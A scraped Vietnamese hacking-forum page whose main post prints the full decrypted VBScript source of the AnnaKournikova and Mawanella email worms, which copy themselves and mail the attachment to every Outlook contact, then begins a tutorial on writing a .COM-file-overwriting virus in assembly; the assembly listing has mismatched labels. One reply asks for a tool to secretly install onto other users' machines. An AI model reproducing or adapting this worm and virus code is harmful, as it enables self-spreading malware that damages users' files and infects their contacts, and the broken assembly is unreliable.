thiết) là bỏ window ScriptingHost (theo bài viết bên PcleHoan).Trong phần tùy chọn các mục cài đặt của windows. Tôi nói đây chỉ là tạm thời bời vì mặc dù có thể nói bằng cách này virus không còn môi trường để hoạt động nhưng một số ứng dụng khác cũng không hoạt động ví dụ như bạn sẽ gặp trục trặc trong việc hiển thị Desktop,explorer theo kiểu As Web Page.. Vậ nên cách tốt nhất vẫn là cập nhật chương trình diệt virus thường xuyên.<br/><br/> //*****Decrypted Code******<br/> 'Vbs.OnTheFly Created By OnTheFly //L@/\/\3R who released the worm<br/> On Error Resume Next<br/> Set ws = CreateObject("WScript.Shell")<br/><br/> //says "Worm made with VBSwg 1.50b": another pitfall<br/> ws.regwrite "HKCU\software\OnTheFly\", Chr(87) & Chr(111) & Chr(114) &<br/> Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) &<br/> Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) &<br/> Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) &<br/> Chr(48) & Chr(98)<br/><br/> Set fso= Createobject("scripting.filesystemobject")<br/><br/> fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0)&<br/> "\AnnaKournikova.jpg.vbs"<br/><br/> if ws.regread ("HKCU\software\OnTheFly\mailed") &lt;&gt; "1" then<br/> Outlook()<br/> end if<br/><br/> //Red Herring? Maybe, but NL *might* be the origin of the worm<br/> if month(now) =1 and day(now) = 26 then<br/> ws.run "Http://www.dynabyte.nl",3,false<br/> end if<br/><br/> //The following section could be an anti-deletion technique<br/> Set AnnaKournikova = fso.opentextfile(wscript.scriptfullname, 1)<br/> SourceCode = AnnaKournikova.readall<br/> AnnaKournikova.Close<br/> Do<br/> If Not (fso.fileexists(wscript.scriptfullname)) Then<br/> Set AnnaKournikova = fso.createtextfile(wscript.scriptfullname, True)<br/> AnnaKournikova.write SourceCode<br/> AnnaKournikova.Close<br/> End If<br/> Loop<br/><br/> Function Outlook()<br/> On Error Resume Next<br/> Set OutlookApp = CreateObject("Outlook.Application")<br/> If OutlookApp= "Outlook"Then<br/> Set Mapi=OutlookApp.GetNameSpace("MAPI")<br/> Set MapiAdList= Mapi.AddressLists<br/> For Each Address In MapiAdList<br/> If Address.AddressEntries.Count &lt;&gt; 0 Then<br/> NumOfContacts = Address.AddressEntries.Count<br/> //Get a list of contacts<br/> For ContactNumber = 1 To NumOfContacts<br/> Set EmailItem = OutlookApp.CreateItem(0)<br/> Set ContactNumber = Address.AddressEntries(ContactNumber)<br/> EmailItem.To = ContactNumber.Address<br/> EmailItem.Subject = "Here you have, ;o)"<br/> EmailItem.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""<br/> set EmailAttachment=EmailItem.Attachments<br/> EmailAttachment.Add fso.GetSpecialFolder(0)& "\AnnaKournikova.jpg.vbs"<br/> EmailItem.DeleteAfterSubmit = True<br/><br/> //Send the thing<br/> If EmailItem.To &lt;&gt; "" Then<br/> EmailItem.Send<br/> ws.regwrite "HKCU\software\OnTheFly\mailed", "1"<br/> End If<br/> Next<br/> End If<br/> Next<br/> end if<br/> End Function<br/> 'Vbswg 1.50b<br/><br/><br/> Ở mã nguồn của virus AnnaKournikova bạn có thể thấy một số chỗ sử dụng Chr(x) đó là cách thay vì viết bằng các ký tự ASCII nó sử dụng hàm Chr để tránh việc bị các trình diệt virus phát hiện.Trong hacking thì chắc các bạn thấy một số trường hợp có sử dụng Chr(x) để thay cho các dấu /,%,\. (tất nhiên là không phải để tránh các trình diệt virus) Còn đây là mã nguồn của mawanella:<br/><br/> --------------------------------------source code----------------<br/><br/> ' Mawanella Worm<br/><br/> ' Decrypted by MrBrownstone<br/><br/> '<br/><br/> On Error ResumeNext<br/><br/> Rem // I hate Mawanella incident<br/><br/> Set W_S = CreateObject("WScript.Shell")<br/><br/> Set fso = CreateObject("Scripting.FileSystemObject")<br/><br/> set file = fso.OpenTextFile(WScript.ScriptFullname,1)<br/><br/> vbscopy=file.ReadAll<br/><br/> main()<br/><br/> sub main()<br/><br/> On Error Resume Next<br/><br/> dim wscr,rr, strMsg<br/><br/> set wscr=CreateObject("WScript.Shell")<br/><br/> Set dirwin = fso.GetSpecialFolder(0)<br/><br/> Set dirsystem = fso.GetSpecialFolder(1)<br/><br/> Set dirtemp = fso.GetSpecialFolder(2)<br/><br/> Set cFile = fso.GetFile(WScript.ScriptFullName)<br/><br/> cFile.Copy(dirsystem&"\Mawanella.vbs")<br/><br/><br/> Set OutlookA = CreateObject("Outlook.Application")<br/><br/> If OutlookA = "Outlook" Then<br/><br/> Set Mapi=OutlookA.GetNameSpace("MAPI")<br/><br/> Set AddLists=Mapi.AddressLists<br/><br/> For Each ListIndex In AddLists<br/><br/> If ListIndex.AddressEntries.Count &lt;&gt; 0 Then<br/><br/> ContactCountX = ListIndex.AddressEntries.Count<br/><br/> For Count= 1 To ContactCountX<br/><br/> Set MailX = OutlookA.CreateItem(0)<br/><br/> Set ContactX = ListIndex.AddressEntries(Count)<br/><br/> 'msgbox contactx.address<br/><br/> 'Mailx.Recipients.Add(ContactX.Address)<br/><br/> MailX.To = ContactX.Address<br/><br/> MailX.Subject = "Mawanella"<br/><br/> MailX.Body = vbcrlf&"Mawanella is one of the Sri Lanka's Muslim Village"&vbcrlf<br/><br/> 'Set Attachment=MailX.Attachments<br/><br/> 'Attachment.Add dirsystem & "\Mawanella.vbs"<br/><br/> 'Mailx.Attachments.Add(dirsystem & "\Mawanella.vbs")<br/><br/> Mailx.Attachments.Add(dirsystem & "\Mawanella.vbs")<br/><br/> MailX.DeleteAfterSubmit = True<br/><br/> If MailX.To &lt;&gt; "" Then<br/><br/> MailX.Send<br/><br/> End If<br/><br/> Next<br/><br/> End If<br/><br/> Next<br/><br/> Else<br/><br/> msgBox "Please Forward this to everyone"<br/><br/> End if<br/><br/> strMsg= " ) (" & vbcrlf<br/><br/> strMsg= strMsg & "( ) ( ) " & vbcrlf<br/><br/> strMsg= strMsg & " ( ) ( )" & vbcrlf<br/><br/> strMsg= strMsg & " ( ) ( )" & vbcrlf<br/><br/> strMsg= strMsg & " -------------------------" & vbcrlf<br/><br/> strMsg= strMsg & " / ( ( ( /\" & vbcrlf<br/><br/> strMsg= strMsg & " / ( / \" & vbcrlf<br/><br/> strMsg= strMsg & " / ( ( / \" & vbcrlf<br/><br/> strMsg= strMsg & " --------------------------------" & vbcrlf<br/><br/> strMsg= strMsg & " | --- | |" & vbcrlf<br/><br/> strMsg= strMsg & " | ----- | | | |" & vbcrlf<br/><br/> strMsg= strMsg & " | | | --- | |" & vbcrlf<br/><br/> strMsg= strMsg & " | | | | |" & vbcrlf<br/><br/> strMsg= strMsg & " --------------------------------" & vbcrlf<br/><br/> strMsg= strMsg & "Mawanella is one of the Sri Lanka's Muslim Village." & vbcrlf<br/><br/> strMsg= strMsg & "This brutal incident happened here 2 Muslim Mosques & 100 Shops are burnt." & vbcrlf<br/><br/> strMsg= strMsg & "I hat this incident, What about you? I can destroy your computer" & vbcrlf<br/><br/> strMsg= strMsg & "I didn't do that because I am a peace-loving citizen."<br/><br/> msgbox strMsg,,"Mawanella"<br/><br/> End sub<br/> ----------------------------------------------------------------<br/><br/> Ở phần sau tôi sẽ hướng dẫn các bạn cách viết một virus đơn giản bằng Asm. Tất nhiên là đỏi hỏi phải biết một ít về Asm.<br/><br/> VIẾT MỘT VIRUS GHI ĐÈ LÊN FILE *.COM BẰNG ASM<br/><br/> (Sử dụng tài liệu của nhóm Code Breaker)<br/><br/> Trước tiên hãy xem đoạn mã của virus:<br/><br/> code segment<br/><br/> assume cs:code,ds:code<br/><br/> org 100h<br/><br/> virus proc near<br/><br/> first_file:<br/><br/> mov ah,4eh<br/><br/> tim_file:<br/><br/> xor cx,cx<br/><br/> lea dx,comsig<br/><br/> int 21h<br/><br/> jc ketthuc<br/><br/> mo_file:<br/><br/> mov ax,3d02h<br/><br/> mov dx,9eh<br/><br/> int 21h<br/><br/> nhiem_file:<br/><br/> xchg bx,ax<br/><br/> mov ah,40h<br/><br/> mov cx,offset horny - offset first_fly<br/><br/> lea dx,first_fly<br/><br/> int 21h<br/><br/> stitch_up:<br/><br/> mov ah,3eh<br/><br/> int 21h<br/><br/> mov ah,4fh<br/><br/> jmp find_fly<br/><br/> ketthuc:<br/><br/> mov ah,09h<br/><br/> mov dx,offset wart<br/><br/> int 21h<br/><br/> cya: int 20h<br/><br/> comsig db "*.com",0<br/><br/> msgadd db 'Congratulations! You have infected all the COM files<br/><br/> in this ',10,13<br/><br/> db 'directory . Have a<br/><br/> nice day.',10,13,'$'<br/><br/> horny label near<br/><br/> virus endp<br/><br/> code ends<br/><br/> end first_fly<br/> Virus của chúng ta sẽ là một file .com ,giới hạn của *.com file là 65,536 bytes.Qua virus này bạn sẽ biết được định dạng chung của một file .com, chúng ta hãy phân tích đoạn mã trên:<br/><br/> ================================================== ======<br/><br/> code segment<br/><br/> tất cả những mã có thể thi hành nằm trong code segment , tất nhiên không nhất thiết segment phải có tên là code, cấu trúc khai báo là như sau:<br/><br/> segment_name segment<br/><br/> ------------<br/><br/> ----------<br/><br/> ----------<br/><br/> segment_name Ends<br/><br/> end<br/> Nếu bạn đã hoc Asembly thì không cần phải đọc chỗ này.<br/><br/> ================================================== ======<br/><br/> assume cs:code,ds:code<br/><br/> Nói chung đây là phần thiết đặt tham số cho file .com của chúng ta, với<br/><br/> CS(code segment) là nơi chứa địa chỉ bắt đầu thực thi của chương trình.<br/><br/> org 100h<br/><br/> org 100h luôn luôn đi theo assume directive. Nó thông báo cho máy tính biết rằng file COM đuợc xác đình tại địa chỉ 100 hex hay 256 bytes.<br/><br/> ================================================== ======<br/><br/> proc virus near<br/> Cái này không thực sự cần thiết vì procedure này là chương trình con duy nhất trong chương trình.Những chương trình lớn hơn sẽ có nhiều Procedure trong code segment để thức hiện một nhiệm vụ nhất định nào đó. ================================================== ======<br/><br/> first_file:<br/><br/> mov ah,4eh<br/><br/> Bậy giờ là phần cốt lõi của virus ,nếu bạn đã hoc lập trình thì các bạn cũng biết nhựng cái theo sau là dấu hai chấm được gọi là nhãn, nó hữ­ ích cho việc xác định vị trí để xài các lệnh nhảy trong ASM hay lệnh goto trong Pascal,delphi...<br/><br/> Để phân tích tiếp chúng ta cần biết thanh ghi là gì?Một thanh ghyi được sử dụng để khởi đầu chỉ lệnh để máy tính thi hành một yêu cầu hoạt động ,được sử dụng để ghi địa chỉ bộ nhớ và chuẩn bị những hàm số học cơ bản , nhập xuất dữ liệu... .Bốn thanh ghi cơ bản sử dụng trong virus này là AX, BX, CX, DX (). Thanh ghi ax sử dụng cho nhập xuất và các thao tác tính toán cơ bản BX (base register) sử dụng để tính toán CX (count register ) sử dụng để tính toán hay đếm trong vòng lặp. DX (data register ) giống như AX , được sử dụng cho nhập xuất , hoạt động nhân chia<br/><br/> Bây giờ trở lại với virus của chúng ta mục đích cua get_fly là tìm thấy file để làm nhiễm. Thực sự là tìm file đầu tiên trong thư mục có thuộc tính chúng ta cần. Vì vậy,chúng tac ần nạp điều kiện vào thanh ghi chung và thực hiện một lệnh ngắt. Ơû đây do là một chương trình DOS nên chỉ đề cập đến thanh ghi 16 bit , môt thanh ghi 16 bit gồm 2 phần, mỗi phần 8 bit ví dụ AX:AH-AL tương tự như vậy ta có : BH - BL, CH - CL, va DH - DL. Giá trị cần nạp vào thanh ghi chung là 4e hex vào AH, CX = zero để set thuộc tính của file là normal, và cuối cùng, DX cần một chuỗi chỉ đính file mà chúng ta đang tìm kiếm để làm nhiễm. Và để di chuyển 4e hex vao AH chúng ta sử dụng lệnh MOV. MOV AH, 4eh có nghĩa là chuyển giá trị 4e hex vào AH<br/><br/><br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/395.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/395/1240.html#1240,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">bai viet hay qua ! xin hoi cac anh em ! cacs anh em co cai tools nao doat quyen online ma am tham cai dat vao may no ko ? vi hien any cac mem online thuong ko chiu mo bat ki file nao . neu bo cong ra de phishing thi qua lau ! hi` ! co ko &gt;? co thi share nhe ! thank before !<br/><br/> <font color='orange'>Edited by NguyenTracHuy :Lưu ý khi gởi bài trả ,nên viết có dấu .</font></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/427.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/427/1232.html#1232,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">nhung du co bi phat di nua ! kien thuc ben tren va bai hoc vua roi cung du cho cong dong IT suy xet lai kien thuc va trinh do cua minh` ! neu mot cai code nhu vay du de cac "you" nao do coi la " kho khan " thi neu mot ngay nao do vai` ba y tuong moi loe len thi sao ay nhi ? hi` hi` ! gop y cho anh em thoi nhe ! </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/155.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/155/1226.html#1226,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">rat cam on cac anh em da share kien thuc ! rat can thiet de hoc ve virus ! </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right"></td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
